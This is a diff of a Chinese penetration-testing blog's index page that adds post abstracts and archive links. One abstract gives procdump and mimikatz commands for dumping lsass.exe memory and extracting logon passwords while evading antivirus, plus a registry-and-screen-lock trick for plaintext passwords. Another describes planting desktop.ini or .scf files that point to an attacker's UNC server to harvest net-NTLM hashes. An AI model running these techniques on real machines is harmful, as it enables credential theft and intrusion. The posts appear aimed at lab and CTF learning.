@@ -339,6 +339,94 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2020/02/23/抓密码/" >
+            
+                <span>各种姿势的hash抓取</span>
+        </a>
+        <div class="abstract-content">
+            抓密码绕杀软必须使用管理员权限procdump+mimikatz
+procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
+mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full” exit
+
+ekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
+
+win10/win2012 R2用户明文密码###抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码
+原...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/02/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/08/23/ntlm请求发起/" >
+            
+                <span>ntlm请求发起</span>
+        </a>
+        <div class="abstract-content">
+            ntlm请求发起deskto.ini文件夹底下都有个文件desktop.ini来指定文件夹图标之类的
+将图标路径改成UNC路径，指向我们的服务器
+当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash。
+scf 文件只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式
+新建test.scf，写入内容，放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash。
+用户头像适用于Wind...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/07/23/sleepy/" >
+            
+                <span>vulnhub|渗透测试sleepy</span>
+        </a>
+        <div class="abstract-content">
+            渗透测试|sleepy题记vulnhub的一个靶机，出的非常有质量，考的知识点很多，花了很多时间取整理，希望大家能学到东西
+环境准备sleepy.ova (Size: 699 MB)
+Download (Mirror): https://download.vulnhub.com/devrandom/sleepy.ova
+Download (Torrent): https://download.vulnhub.com/devrandom/sleepy.ova.torrent     ( Magnet)
+攻击机 Kali IP : 192.168.10.128
+靶机在同一C段下 IP ：19...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/07/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2019/02/23/Matrix 1/" >
             
                 <span>vulnhub|渗透测试Matrix 1</span>
@@ -666,9 +754,66 @@ Download (Mirror): https://download.vulnhub.com/lampiao/Lampi...
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 10
+        Total : 13
         </div>
         <!-- search  -->
         
@@ -679,12 +824,31 @@ Download (Mirror): https://download.vulnhub.com/lampiao/Lampi...
     
     
     
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2020/02/23/抓密码/" >各种姿势的hash抓取</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/SICKOS/" >SICKOS 1.1 - CTF</a>
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/ntlm请求发起/" >ntlm请求发起</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2019/07/23/sleepy/" >vulnhub|渗透测试sleepy</a>
         </li>
     
     
@@ -695,6 +859,11 @@ Download (Mirror): https://download.vulnhub.com/lampiao/Lampi...
     
         <li class="archive-post-item">
             <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/Matrix 1/" >vulnhub|渗透测试Matrix 1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/SICKOS/" >SICKOS 1.1 - CTF</a>
         </li>
     
     
@@ -723,12 +892,12 @@ Download (Mirror): https://download.vulnhub.com/lampiao/Lampi...
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/ctf入门总结/" >ctf入门总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/ctf入门总结/" >ctf入门总结</a>
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
         </li>
     
     
